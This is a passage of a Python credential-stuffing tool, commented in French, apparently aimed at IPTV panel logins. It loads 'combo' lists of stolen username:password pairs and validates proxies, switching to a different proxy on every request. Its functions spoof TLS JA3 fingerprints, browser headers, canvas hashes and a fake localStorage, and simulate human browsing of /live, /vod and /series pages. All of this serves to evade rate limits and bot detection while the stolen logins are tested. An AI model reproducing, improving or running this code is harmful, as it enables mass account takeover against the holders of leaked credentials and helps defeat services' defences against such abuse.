        print(f'\x1b[0;90m{i}\x1b[0m - \x1b[0;33m{name}\x1b[0m')
    while True:
        try:
            k = int(input('\x1b[0;90mChoice ➤ \x1b[0;33m').strip())
            print('\x1b[0m', end='')
            if 1 <= k <= len(files):
                return (os.path.join(COMBO_DIR, files[k - 1]), files[k - 1])
        except Exception:
            print('\x1b[1;31mInvalid input, try again.\x1b[0m')

def ask_number_of_parts():
    """
    Demande à l'utilisateur combien de parties il souhaite pour diviser le combo
    Version colorée et professionnelle
    """
    # Couleurs professionnelles
    GOLD   = "\x1b[1;33m"    # Jaune vif pour les titres
    YELLOW = "\x1b[0;33m"    # Jaune standard pour les options
    RED    = "\x1b[1;31m"    # Rouge pour les accents
    GRAY   = "\x1b[0;90m"    # Gris pour le texte secondaire
    RESET  = "\x1b[0m"
    
    # Ligne de séparation décorative
    separator = f"{GRAY}┌{'─' * 41}┐{RESET}"
    
    print(f"\n{separator}")
    print(f"{GRAY}│{RESET} {GOLD}📊 COMBO SPLITTING STRATEGY {RESET} {GRAY}{RESET}")
    print(f"{GRAY}│{RESET} {GRAY}How many parts for the analysis?{RESET} {GRAY}{RESET}")
    print(f"{GRAY}├{'─' * 41}┤{RESET}")
    print(f"{GRAY}│{RESET} {YELLOW}1{RESET} {GRAY}→{RESET} {YELLOW}Single part{RESET} {GRAY}(Speed, no rotation){RESET} {GRAY}{RESET}")
    print(f"{GRAY}│{RESET} {YELLOW}2{RESET} {GRAY}→{RESET} {YELLOW}Two parts{RESET} {GRAY}(balanced performance){RESET}     {GRAY}{RESET}")
    print(f"{GRAY}│{RESET} {YELLOW}3{RESET} {GRAY}→{RESET} {YELLOW}Three parts{RESET} {GRAY}(recommended){RESET}           {GRAY}{RESET}")
    print(f"{GRAY}│{RESET} {GRAY}Press Enter for default (3 parts){RESET}     {GRAY}{RESET}")
    print(f"{GRAY}└{'─' * 41}┘{RESET}")
    
    while True:
        try:
            choice = input(f"\n{GOLD}Strategy choice{RESET} {GRAY}[{YELLOW}1{GRAY}/{YELLOW}2{GRAY}/{YELLOW}3{GRAY}] ➤ {YELLOW}").strip()
            print(RESET, end='')
            
            if not choice:  # Enter vide = défaut
                print(f"{GRAY}→ Using default: {YELLOW}3 parts{RESET}")
                return 3
                
            choice = int(choice)
            if choice == 1:
                print(f"{GRAY}→ Selected: {YELLOW}Single part mode{RESET} {RED}⚡{RESET}")
                return 1
            elif choice == 2:
                print(f"{GRAY}→ Selected: {YELLOW}Two parts mode{RESET} {GOLD}⚖️{RESET}")
                return 2
            elif choice == 3:
                print(f"{GRAY}→ Selected: {YELLOW}Three parts mode{RESET} {GOLD}🎯{RESET}")
                return 3
            else:
                print(f"{RED}❌ Invalid choice! Please select 1, 2 or 3.{RESET}")
                
        except ValueError:
            print(f"{RED}❌ Please enter a valid number (1, 2 or 3).{RESET}")
        except (KeyboardInterrupt, EOFError):
            print(f"{GRAY}→ Using default: {YELLOW}3 parts{RESET}")
            return 3
                                    
def load_items(combo_path):
    creds = []
    with open(combo_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            s = line.strip()
            if not s or s.startswith('#'):
                continue
            m = re.split('[:;\\|]', s, 1)
            if len(m) == 2:
                user, pwd = (m[0].strip(), m[1].strip())
                creds.append((user, pwd))
    return creds
    
# =================== PROXY MANAGEMENT ===================

# ------------------ Proxy chooser & improved loader ------------------
def list_proxy_files_dir():
    """
    Retourne (files_list, prox_dir) pour le dossier OUT_DIR/proxys.
    Crée le dossier s'il n'existe pas.
    """
    prox_dir = os.path.join(OUT_DIR, 'proxys')
    os.makedirs(prox_dir, exist_ok=True)
    files = [f for f in sorted(os.listdir(prox_dir)) if os.path.isfile(os.path.join(prox_dir, f))]
    return files, prox_dir

def choose_proxy_file_interactive(files, prox_dir):
    """Affiche la liste et demande de choisir un fichier. Retourne chemin complet ou None."""
    if not files:
        print("\x1b[1;33m[PROXY]\x1b[0m Aucun fichier de proxies trouvé dans '{0}'. Place tes .txt ici.".format(prox_dir))
        return None

    print("\n\x1b[1;33m[PROXY]\x1b[0m Fichiers de proxies disponibles dans: {0}\n".format(prox_dir))
    for i, fn in enumerate(files, start=1):
        print(f"  {i:2d} - {fn}")
    print("  0 - Annuler (ne pas utiliser de proxy)")

    try:
        raw = input("\nChoix fichier proxy ➤ ").strip()
    except Exception:
        raw = ""

    if not raw:
        print("\x1b[90m→ Annulé. Aucun proxy utilisé.\x1b[0m")
        return None

    try:
        idx = int(raw)
        if idx == 0:
            return None
        if 1 <= idx <= len(files):
            return os.path.join(prox_dir, files[idx-1])
    except Exception:
        pass

    # si l'utilisateur a entré un nom de fichier directement
    candidate = os.path.join(prox_dir, raw)
    if os.path.isfile(candidate):
        return candidate

    print("\x1b[1;31m[PROXY]\x1b[0m Choix invalide.")
    return None

def load_proxies(proxy_path=None):
    """
    Charge les proxies depuis proxy_path s'il est fourni.
    Sinon conserve le comportement précédent (OUT_DIR/proxy.txt).
    Retourne la liste de proxies parsées au format {'http':..., 'https':...}
    """
    if proxy_path is None:
        proxy_file = os.path.join(OUT_DIR, 'proxy.txt')
    else:
        proxy_file = proxy_path

    proxies = []
    if not os.path.isfile(proxy_file):
        if proxy_path:
            print(f"\x1b[1;33m[PROXY]\x1b[0m Fichier non trouvé: {proxy_file}")
        return proxies

    try:
        with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue

                # Support: user:pass@ip:port  OR ip:port  OR http://ip:port
                if '@' in line:
                    auth, server = line.split('@', 1)
                    if ':' in server:
                        ip, port = server.split(':', 1)
                        proxy = {
                            'http': f'http://{auth}@{ip}:{port}',
                            'https': f'http://{auth}@{ip}:{port}'
                        }
                    else:
                        continue
                else:
                    if '://' in line:
                        line2 = line.split('://', 1)[1]
                    else:
                        line2 = line

                    if ':' in line2:
                        ip, port = line2.split(':', 1)
                        proxy = {
                            'http': f'http://{ip}:{port}',
                            'https': f'http://{ip}:{port}'
                        }
                    else:
                        continue

                proxies.append(proxy)

        print(f"\x1b[1;32m[INFO]\x1b[0m Loaded {len(proxies)} proxies from {os.path.basename(proxy_file)}")
        return proxies

    except Exception as e:
        print(f"\x1b[1;33m[WARNING]\x1b[0m Failed to load proxies: {e}")
        return []
# ---------------------------------------------------------------------

def _get_random_proxy():
    with PROXY_LOCK:
        if not PROXY_POOL:
            return None
        return random.choice(PROXY_POOL)

def _parse_proxy_line(line: str):
    line = (line or "").strip()
    if not line or line.startswith("#"):
        return None
    # Formats acceptés: user:pass@ip:port | ip:port | http://ip:port | http://user:pass@ip:port
    if "://" in line:
        line = line.split("://", 1)[1]
    if "@" in line:
        auth, host = line.split("@", 1)
    else:
        auth, host = None, line
    if ":" not in host:
        return None
    ip, port = host.split(":", 1)
    if auth:
        url = f"http://{auth}@{ip}:{port}"
    else:
        url = f"http://{ip}:{port}"
    return {"http": url, "https": url}

def _add_proxy_to_pool(p):
    """Ajoute au pool si nouveau (thread-safe), met à jour stats."""
    if not p or "http" not in p:
        return False
    key = p["http"]
    with PROXY_LOCK:
        if key in PROXY_FILE_WATCH["known"]:
            return False
        PROXY_FILE_WATCH["known"].add(key)
        PROXY_POOL.append(p)
        PROXY_FILE_STATS["loaded"] = len(PROXY_FILE_WATCH["known"])
        PROXY_FILE_STATS["last_add_ts"] = int(time.time())
    return True

def start_proxy_file_watcher(file_path, poll_interval=1.0):
    """
    Lit périodiquement le fichier 'file_path' et ajoute EN DIRECT
    les nouveaux proxys au PROXY_POOL (sans filtrage).
    """
    if not file_path or not os.path.isfile(file_path):
        return

    with PROXY_LOCK:
        PROXY_FILE_WATCH.update({"path": file_path, "known": set(), "running": True})
        PROXY_FILE_STATS.update({"file": os.path.basename(file_path), "lines": 0, "loaded": 0, "last_add_ts": 0})

    # Charge l'existant une première fois (sans logs bruyants)
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
        count_lines = 0
        for ln in lines:
            count_lines += 1
            p = _parse_proxy_line(ln)
            if p: _add_proxy_to_pool(p)
        with PROXY_LOCK:
            PROXY_FILE_STATS["lines"] = count_lines
    except Exception:
        pass

    def _watch():
        last_size = 0
        try:
            last_size = os.path.getsize(file_path)
        except Exception:
            last_size = 0

        while not _STOP_ALL.is_set() and PROXY_FILE_WATCH.get("running", False):
            try:
                # s'il y a une rotation / réécriture, on relit tout
                cur_size = os.path.getsize(file_path)
                if cur_size < last_size:
                    # reset (fichier réécrit)
                    with PROXY_LOCK:
                        PROXY_FILE_WATCH["known"].clear()
                        PROXY_POOL[:] = []  # on repart sur le contenu actuel du fichier
                        PROXY_FILE_STATS.update({"lines": 0, "loaded": 0})
                    last_size = 0

                # lire les nouvelles lignes
                new_lines = []
                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    for idx, ln in enumerate(f, 1):
                        new_lines.append(ln)
                # MAJ stats lignes totales
                with PROXY_LOCK:
                    PROXY_FILE_STATS["lines"] = len(new_lines)

                # (ré)ajout non-doublonné
                for ln in new_lines:
                    p = _parse_proxy_line(ln)
                    if p:
                        _add_proxy_to_pool(p)

                last_size = cur_size
            except Exception:
                pass

            # petite pause interruptible
            _interruptible_sleep(poll_interval)

    # Lancer le watcher
    spawn_thread(target=_watch, name="proxy-file-watch", daemon=True)
    
def _rotate_proxy(session):
    p = _get_random_proxy()
    if p:
        session.proxies = p
        session.last_proxy_rotate = time.time()
        
# (Optionnel) remplace l'ancienne version simple
def _test_proxy(proxy, per_endpoint_timeout=5.0):
    """
    Teste un proxy sur plusieurs endpoints.
    Retourne (ok: bool, latency_ms: int|None, endpoint_used: str|None)
    """
    endpoints = [
        "http://httpbin.org/ip",                # HTTP simple
        "http://ip-api.com/json",               # HTTP JSON
        "https://api.ipify.org?format=json",    # HTTPS simple
    ]

    for url in endpoints:
        t0 = time.time()
        try:
            r = requests.get(
                url,
                proxies=proxy,
                timeout=per_endpoint_timeout,
                verify=False,
                allow_redirects=True
            )
            # ✅ accepte 200 et 204 (comme ProxyLive)
            if r is not None and r.status_code in (200, 204):
                body = (r.text or "").strip()
                ctype = (r.headers.get("Content-Type", "") or "").lower()

                # Heuristique de validité :
                # - payload non vide (texte ou JSON)
                # - OU statut 204 (No Content) accepté quand même
                has_payload = bool(body) or ("application/json" in ctype and bool(body))
                if has_payload or r.status_code == 204:
                    latency = int((time.time() - t0) * 1000)
                    return True, latency, url
        except Exception:
            # on essaie l'endpoint suivant
            pass

    return False, None, None

def validate_proxies(
    proxies,
    max_workers=20,
    per_endpoint_timeout=5.0,
    target_valid=None,
    progress_every=25
):
    """
    Valide les proxies en parallèle (workers).
    - max_workers : nb de threads en parallèle
    - per_endpoint_timeout : timeout par endpoint (secondes)
    - target_valid : si None => valider TOUS les proxies fournis.
                     si entier => s'arrêter dès qu'on a ce nombre de bons proxies.
    - progress_every : fréquence d'affichage de la progression

    Retour : liste des proxies valides (dicts {'http': ..., 'https': ...})
    """
    if not proxies:
        return []

    total = len(proxies)
    print(f"\x1b[1;36m[INFO]\x1b[0m Testing {total} proxies with {max_workers} workers...")

    valid = []
    tested = 0
    lock = threading.Lock()

    def worker(p):
        ok, latency, used = _test_proxy(p, per_endpoint_timeout=per_endpoint_timeout)
        with lock:
            nonlocal tested, valid
            tested += 1
            if ok:
                # si target_valid est défini, on ne dépasse pas ce nombre ; sinon on ajoute tout
                if (target_valid is None) or (len(valid) < int(target_valid)):
                    valid.append(p)
                    lat_str = f"{latency} ms" if latency is not None else "—"
                    print(f"\x1b[1;32m[PROXY]\x1b[0m Valid ({lat_str}) → {p.get('http','')}")
            # Affichage de progression périodique
            if (tested % max(1, progress_every) == 0) and ((target_valid is None) or (len(valid) < int(target_valid))):
                print(f"\x1b[90m[INFO]\x1b[0m Progress: {tested}/{total} tested — {len(valid)} valid")

    # Lancer les walkers
    workers = min(max_workers, max(1, total))
    with ThreadPoolExecutor(max_workers=workers, thread_name_prefix="pxw") as ex:
        futures = [ex.submit(worker, p) for p in proxies]

        # Si target_valid est défini, on peut terminer la boucle dès qu'on l'atteint.
        try:
            if target_valid is None:
                # attendre que tous les tests finissent
                for _ in as_completed(futures):
                    pass
            else:
                # on surveille et on sort dès qu'on a target_valid valides
                for _ in as_completed(futures):
                    with lock:
                        if len(valid) >= int(target_valid):
                            break
        except Exception:
            # en cas d'erreur, on laisse le contexte fermer proprement
            pass

    print(f"\x1b[1;32m[INFO]\x1b[0m Found {len(valid)} working proxies (tested {tested}/{total})")
    return valid

def _enable_per_request_proxy_rotation(session):
    """
    Force une rotation de proxy à CHAQUE requête envoyée par `session`.
    On monkey-patche session.request pour choisir un proxy aléatoire juste avant l’envoi.
    """
    # garde l’implémentation d’origine
    session._orig_request = session.request

    def _rotating_request(method, url, **kwargs):
        # tire un proxy dans le pool global avant chaque requête
        p = None
        try:
            with PROXY_LOCK:
                if PROXY_POOL:
                    p = random.choice(PROXY_POOL)
        except Exception:
            p = None

        if p:
            session.proxies = p
            session.last_proxy_rotate = time.time()
            # métriques (facultatif)
            if hasattr(session, "metrics"):
                session.metrics['proxy_rotations'] = session.metrics.get('proxy_rotations', 0) + 1
        else:
            # aucun proxy dispo => on envoie sans proxy
            session.proxies = None

        return session._orig_request(method, url, **kwargs)

    # active le wrapper
    session.request = _rotating_request
            
# =================== TLS JA3 / FINGERPRINT AVANCÉ ===================
import ssl
from urllib3.util.ssl_ import create_urllib3_context

class FingerprintedAdapter(requests.adapters.HTTPAdapter):
    """Adapter avec fingerprint TLS JA3 variable et signatures navigateurs réalistes"""
    
    def __init__(self, *args, **kwargs):
        self.ja3_signature = self._generate_ja3_signature()
        super().__init__(*args, **kwargs)
    
    def _generate_ja3_signature(self):
        """Génère une signature JA3 réaliste basée sur de vrais navigateurs"""
        # Cipher suites par famille de navigateur
        chrome_ciphers = [
            "TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256",
            "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-RSA-AES128-GCM-SHA256",
            "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384"
        ]
        
        firefox_ciphers = [
            "TLS_AES_128_GCM_SHA256", "TLS_CHACHA20_POLY1305_SHA256", "TLS_AES_256_GCM_SHA384",
            "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-RSA-AES128-GCM-SHA256"
        ]
        
        safari_ciphers = [
            "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256", "TLS_AES_128_GCM_SHA256",
            "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384"
        ]
        
        # Choisir une famille aléatoirement
        family = random.choice(['chrome', 'firefox', 'safari', 'edge'])
        if family == 'chrome':
            ciphers = chrome_ciphers
        elif family == 'firefox':
            ciphers = firefox_ciphers
        else:
            ciphers = safari_ciphers
            
        # Mélanger légèrement l'ordre pour varier le JA3
        if random.random() > 0.7:
            random.shuffle(ciphers)
            
        return ":".join(ciphers)
    
    def init_poolmanager(self, *args, **kwargs):
        try:
            ctx = create_urllib3_context()
        except Exception:
            ctx = ssl.create_default_context()

        # Configuration TLS avancée
        try:
            ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        except Exception:
            try:
                ctx.options |= getattr(ssl, "OP_NO_TLSv1", 0) | getattr(ssl, "OP_NO_TLSv1_1", 0)
            except Exception:
                pass

        # Extensions TLS variables
        try:
            # ALPN comme les vrais navigateurs
            alpn_protocols = ['h2', 'http/1.1']
            if random.random() > 0.3:  # 70% du temps h2 en premier
                alpn_protocols = ['h2', 'http/1.1']
            else:
                alpn_protocols = ['http/1.1', 'h2']
            ctx.set_alpn_protocols(alpn_protocols)
        except Exception:
            pass

        # Cipher suites dynamiques
        try:
            ctx.set_ciphers(self.ja3_signature)
        except Exception:
            pass

        # Courbes elliptiques variables
        try:
            curves = ['prime256v1', 'secp384r1', 'secp521r1', 'X25519']
            ctx.set_ecdh_curve(random.choice(curves))
        except Exception:
            pass

        # Signature algorithms extension (simulée)
        if random.random() > 0.5:
            try:
                if hasattr(ctx, 'set_sigalgs'):
                    sigalgs = 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256'
                    ctx.set_sigalgs(sigalgs)
            except Exception:
                pass

        kwargs['ssl_context'] = ctx
        return super().init_poolmanager(*args, **kwargs)

# ---- A ajouter près de la classe FingerprintedAdapter ----
def _regenerate_tls_for_session(session):
    """
    Recrée et remonte un FingerprintedAdapter avec nouvelle JA3 cohérente.
    Appeler après avoir changé session.headers['User-Agent'].
    """
    try:
        # Générer un nouvel adapter avec une JA3 qui correspond à l'UA
        new_adapter = FingerprintedAdapter(pool_connections=100, pool_maxsize=100, max_retries=0, pool_block=False)
        # Optionnel : forcer la signature ja3 à être cohérente avec la famille UA
        ua = session.headers.get("User-Agent", "")
        if "Firefox" in ua and "Mobile" not in ua:
            # forcer famille firefox si nécessaire (implémentation dans l'adapter)
            pass

        # Remonter l'adapter sur la session (remplace l'ancien)
        session.mount("http://", new_adapter)
        session.mount("https://", new_adapter)
        # Exposer la signature actuelle aussi sur la session pour usage ailleurs
        session.ja3_signature = getattr(new_adapter, "ja3_signature", None)
    except Exception:
        # fail safe : on laisse l'ancien adapter et continue
        session.ja3_signature = getattr(session, "ja3_signature", None)
        
def _generate_canvas_fingerprint():
    """Génère un fingerprint canvas réaliste"""
    fingerprints = [
        "c2a9b9d8e1f4a7b6c5d8e9f0a1b2c3d4",
        "a1b2c3d4e5f67890abcd1234ef567890", 
        "f0e1d2c3b4a59687f6e5d4c3b2a1908f",
        "1234567890abcdef1234567890abcdef"
    ]
    return random.choice(fingerprints)

def _add_browser_fingerprint_headers(session):
    """Ajoute des headers simulant un fingerprint de navigateur complet"""
    
    # WebRTC fingerprint simulation
    if random.random() > 0.7:
        session.headers['X-WebRTC-Support'] = 'true'
    
    # Canvas fingerprint simulation  
    if random.random() > 0.8:
        session.headers['X-Canvas-Fingerprint'] = _generate_canvas_fingerprint()
    
    # Timezone et préférences
    timezones = ['Europe/Paris', 'America/New_York', 'Asia/Tokyo', 'UTC']
    session.headers['X-Client-Timezone'] = random.choice(timezones)
    
    # Screen resolution réaliste
    resolutions = [
        '1920x1080', '1366x768', '1536x864', '1440x900', 
        '1280x720', '1600x900', '2560x1440'
    ]
    session.headers['X-Client-Resolution'] = random.choice(resolutions)
# Simuler un petit "localStorage" côté session
def _init_client_storage(session):
    """
    Initialise une structure de 'pseudo localStorage' et renseigne cookies/headers de suivi.
    À appeler lors de la création de la session.
    """
    try:
        if not hasattr(session, 'client_storage'):
            # stockage mini (paires clés/valeurs)
            session.client_storage = {
                'theme': random.choice(['dark','light']),
                'last_visit': str(int(time.time())),
                'consent_v2': random.choice(['ok','declined']),
                # token persistant simulé
                'persist_token': f"ptok_{random.randint(1000000,9999999)}"
            }
            # exposer en tant que cookie persistant (expire distant)
            session.cookies.set('persist_token', session.client_storage['persist_token'], path='/', domain=None)
            # header "fingerprint" localStorage (simulate)
            session.headers['X-Local-Storage'] = ','.join(f"{k}={v}" for k,v in session.client_storage.items())
            # indexedDB-like hash
            session.headers['X-IndexedDB-Hash'] = f"idx_{random.randint(1000000,9999999)}"
    except Exception:
        pass

def _update_client_storage_on_rotation(session):
    """
    Met à jour légèrement le stockage simulé quand on rotate UA/cookies.
    Appeler après rotation cookies/UA.
    """
    try:
        if not hasattr(session, 'client_storage'):
            _init_client_storage(session)
            return
        # rafraîchir last_visit
        session.client_storage['last_visit'] = str(int(time.time()))
        # parfois changer le theme (10% du temps)
        if random.random() > 0.9:
            session.client_storage['theme'] = random.choice(['dark','light','auto'])
        # mettre à jour cookie & headers
        session.cookies.set('persist_token', session.client_storage['persist_token'], path='/', domain=None)
        session.headers['X-Local-Storage'] = ','.join(f"{k}={v}" for k,v in session.client_storage.items())
        session.headers['X-IndexedDB-Hash'] = f"idx_{random.randint(1000000,9999999)}"
    except Exception:
        pass
        
def _simulate_http2_behavior(session):
    """
    Simule des headers HTTP/2 uniquement si la session a un JA3 / ALPN favorisant h2.
    On se base sur session.ja3_signature (exposé après _regenerate_tls_for_session).
    """
    try:
        # Par défaut, on ne suppose pas http/2
        prefer_h2 = False
        ja3 = getattr(session, "ja3_signature", "") or ""
        # heuristique simple : si la ja3 contient TLS_AES_... ou si ALPN mis en adapter
        if "TLS_AES_128_GCM_SHA256" in ja3 or "TLS_CHACHA20_POLY1305_SHA256" in ja3:
            # probabilité de supporter h2
            prefer_h2 = random.random() > 0.25  # 75% si ciphers modernes
        else:
            prefer_h2 = random.random() > 0.82  # rare otherwise

        if prefer_h2 and random.random() > 0.4:
            # Headers plausibles pour HTTP/2
            session.headers.update({
                'TE': 'trailers',
                'Accept-Encoding': _pick_accept_encoding(),  # br seulement si dispo
            })
            # simuler Sec-CH si chrome-like
            if 'Chrome' in session.ua or 'Edg' in session.ua:
                if random.random() > 0.5:
                    session.headers['Accept-CH'] = 'Sec-CH-UA, Sec-CH-UA-Mobile, Sec-CH-UA-Platform'
            # Indiquer l'info h2 dans la session pour checks ultérieurs
            session._sim_pref_h2 = True
        else:
            # retirer les headers HTTP/2 potentiellement contradictoires
            session.headers.pop('TE', None)
            session._sim_pref_h2 = False
    except Exception:
        pass
        
def _generate_navigation_headers():
    """Génère des headers spécifiques pour la navigation"""
    nav_headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'fr-FR,fr;q=0.9,en;q=0.8',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Upgrade-Insecure-Requests': '1'
    }
    
    # Ajouter des headers mobiles 40% du temps
    if random.random() > 0.6:
        nav_headers['Sec-Fetch-User'] = '?1'
        
    return nav_headers
                
def _simulate_browser_navigation(server, user, pwd):
    """
    Simule une séquence de navigation complète comme un vrai navigateur,
    tout en restant instantanément interruptible via F/S.
    """
    base_url = f'http://{server}'
    session = _thread_session()
    
    # ✅ DÉTECTION PROXY POUR LA NAVIGATION
    using_proxy = bool(session.proxies)
    connect_timeout, read_timeout = _get_adaptive_timeouts(using_proxy)
    
    navigation_steps = []
    
    # Étape 1: Visite de la page d'accueil (60% du temps)
    if random.random() > 0.4:
        navigation_steps.append({
            'url': base_url + '/',
            'method': 'GET',
            'delay': random.uniform(1.0, 3.0),
            'description': 'Visite page accueil'
        })
    
    # Étape 2: Requête des ressources statiques (CSS/JS)
    if random.random() > 0.3:
        resources = ['/style.css', '/main.js', '/app.js', '/bootstrap.css']
        for resource in random.sample(resources, k=random.randint(1, 3)):
            navigation_steps.append({
                'url': base_url + resource,
                'method': 'GET', 
                'delay': random.uniform(0.1, 0.5),
                'description': f'Chargement ressource {resource}'
            })
    
    # Étape 3: Simulation de clics ou navigation
    actions = ['/live', '/vod', '/series', '/guide', '/help']
    for action in random.sample(actions, k=random.randint(1, 2)):
        navigation_steps.append({
            'url': base_url + action,
            'method': 'GET',
            'delay': random.uniform(0.5, 2.0),
            'description': f'Navigation vers {action}'
        })
    
    # Exécution des étapes de navigation (interruptible)
    for step in navigation_steps:
        if _STOP_ALL.is_set():
            break

        try:
            # Délai "humain" avant l'action — interruptible
            _interruptible_sleep(step['delay'] * random.uniform(0.8, 1.2))
            if _STOP_ALL.is_set():
                break

            # Rotation UA/headers par requête
            _enhanced_rotate_user_agent(session)

            # Exécution de la requête avec TIMEOUTS ADAPTATIFS
            if step['method'] == 'GET':
                session.get(
                    step['url'],
                    timeout=(connect_timeout, read_timeout),  # ← TIMEOUTS ADAPTATIFS ICI
                    headers=_generate_navigation_headers(),
                    verify=(random.random() > 0.3)
                )

        except Exception:
            # Erreurs réseau/HTTP ignorées ici
            pass

        if _STOP_ALL.is_set():
            break

        # Petite pause aléatoire entre actions — interruptible
        if random.random() > 0.5:
            _interruptible_sleep(random.uniform(0.2, 1.0))
            if _STOP_ALL.is_set():
                break
                                                    
# =================== HTTP SESSIONS (par thread) ===================

_thread_local = threading.local()

def _thread_session():
    """
    Session par thread ultra-optimisée avec furtivité avancée, performances accrues et support proxy.
    Version complète avec fingerprinting TLS avancé, simulation de navigation, comportement humain
    et rotation de proxies (un proxy DIFFÉRENT à CHAQUE requête).
    """
    s = getattr(_thread_local, "s", None)
    if s is None:
        s = requests.Session()
        
        # 🔧 ADAPTATEUR TLS AVEC FINGERPRINTING AVANCÉ
        adapter = FingerprintedAdapter(
            pool_connections=100,
            pool_maxsize=100,
            max_retries=0,
            pool_block=False,
        )
        s.mount("http://", adapter)
        s.mount("https://", adapter)

        # 🔄 INITIALISATION DES PROXIES — pool global
        p = _get_random_proxy()  # tire dans PROXY_POOL (partagé entre threads)
        if p:
            s.proxies = p
            s.last_proxy_rotate = time.time()
            s.proxy_failures = 0
            s.max_proxy_failures = 3
        else:
            s.proxies = None

        # ✅ Rotation de proxy à CHAQUE requête (monkey-patch de session.request)
        if not hasattr(s, "_orig_request"):
            s._orig_request = s.request

            def _rotating_request(method, url, **kwargs):
                # choisir un proxy juste avant l’envoi
                chosen = None
                try:
                    lock = globals().get("PROXY_LOCK")
                    pool = globals().get("PROXY_POOL", [])
                    if lock is not None:
                        with lock:
                            if pool:
                                chosen = random.choice(pool)
                    else:
                        if pool:
                            chosen = random.choice(pool)
                except Exception:
                    chosen = None

                if chosen:
                    s.proxies = chosen
                    s.last_proxy_rotate = time.time()
                    if hasattr(s, "metrics"):
                        s.metrics["proxy_rotations"] = s.metrics.get("proxy_rotations", 0) + 1
                else:
                    s.proxies = None  # aucun proxy dispo → envoi sans proxy

                return s._orig_request(method, url, **kwargs)

            s.request = _rotating_request  # activation

        # 🎭 USER-AGENT INTELLIGENT (pondéré entre mobile et desktop)
        try:
            weights = [3 if ('Mobile' in ua or 'Android' in ua or 'iPhone' in ua) else 1 for ua in USER_AGENTS]
            selected_ua = random.choices(USER_AGENTS, weights=weights, k=1)[0]
        except Exception:
            selected_ua = random.choice(USER_AGENTS)

        # Détection famille navigateur
        def _detect_family(ua):
            if 'Edg' in ua or 'Edge' in ua: return 'edge'
            if 'Firefox' in ua and 'Mobile' not in ua: return 'firefox'
            if 'Safari' in ua and 'Chrome' not in ua: return 'safari'
            if 'Chrome' in ua: return 'chrome'
            return 'chrome'

        browser_family = _detect_family(selected_ua)

        # Exposer quelques attributs utiles
        s.ua = selected_ua
        s.browser_family = browser_family
        s.request_count = 0
        s.last_rotation = time.time()

        # 🧠 HEADERS DE BASE COHÉRENTS
        base_headers = {
            "User-Agent": s.ua,
            "Accept": "application/json,text/plain,*/*",
            "Accept-Language": "fr-FR,fr;q=0.9,en;q=0.8,pt;q=0.7,es;q=0.6",
            "Accept-Encoding": _pick_accept_encoding(),   # encodage dynamique
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        }

        # Sec-CH / Sec-Fetch selon la famille
        if browser_family in ('chrome', 'edge'):
            chrome_ver = str(random.randint(120, 125))
            base_headers.update({
                "Sec-Ch-Ua": f'"Chromium";v="{chrome_ver}", "Google Chrome";v="{chrome_ver}", "Not=A?Brand";v="{random.randint(8,99)}"',
                "Sec-Ch-Ua-Mobile": "?1" if ("Mobile" in s.ua or "Android" in s.ua or "iPhone" in s.ua) else "?0",
                "Sec-Ch-Ua-Platform": random.choice(['"Android"', '"Windows"', '"Linux"', '"macOS"']),
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "Priority": "u=1, i"
            })
        elif browser_family == 'safari':
            base_headers.update({
                "DNT": random.choice(["1", "0"]),
                "Referer": "https://www.google.com/",
            })
        elif browser_family == 'firefox':
            base_headers.update({
                "Referer": "https://www.bing.com/",
            })

        s.headers.update(base_headers)

        # 🍪 COOKIES INITIAUX AVEC COHÉRENCE
        try:
            init_cookies = _get_cookies_for_request()
            if init_cookies:
                s.cookies.update(init_cookies)
                cookie_lang = init_cookies.get('lang', 'fr')
                if cookie_lang in ['en', 'pt', 'es', 'de']:
                    s.headers['Accept-Language'] = (
                        f'{cookie_lang}-{cookie_lang.upper()},{cookie_lang};q=0.9,fr;q=0.8,pt;q=0.7'
                    )
        except Exception:
            pass

        # 🗄️ Init du "localStorage / IndexedDB" simulé (headers/cookies persistants)
        try:
            _init_client_storage(s)
        except Exception:
            pass

        # 🔧 AJOUT DES CAPACITÉS DE FINGERPRINTING AVANCÉ
        s.fingerprint = {
            'canvas_hash': _generate_canvas_fingerprint(),
            'webgl_vendor': random.choice(['NVIDIA', 'Intel', 'AMD', 'Google']),
            'renderer': random.choice(['ANGLE', 'Mesa', 'SwiftShader']),
            'timezone': random.choice(['Europe/Paris', 'America/New_York', 'Asia/Tokyo']),
            'platform': random.choice(['Win32', 'MacIntel', 'Linux x86_64'])
        }

        # ⚙️ PARAMÈTRES DE ROTATION DYNAMIQUES (UA/cookies/headers)
        s.ua_rotate_every = random.randint(25, 75)
        s.cookie_rotate_every = random.randint(20, 40)
        s.header_variation_every = random.randint(10, 30)
        s.proxy_rotate_every = 0  # rotation proxy gérée per-request maintenant

        # 📊 MÉTRIQUES DE PERFORMANCE AVEC SUIVI PROXY
        s.metrics = {
            'total_requests': 0,
            'failed_requests': 0,
            'avg_response_time': 0.0,
            'last_successful_request': None,
            'proxy_failures': 0,
            'proxy_rotations': 0
        }

        # 🔧 OPTIMISATIONS GÉNÉRALES
        s.trust_env = False  # Évite d'utiliser les proxies système
        s.verify = True
        s.default_timeout = (3.0, 12.0)

        # 🔒 Exposer la JA3 de l'adapter et configurer la regen TLS
        try:
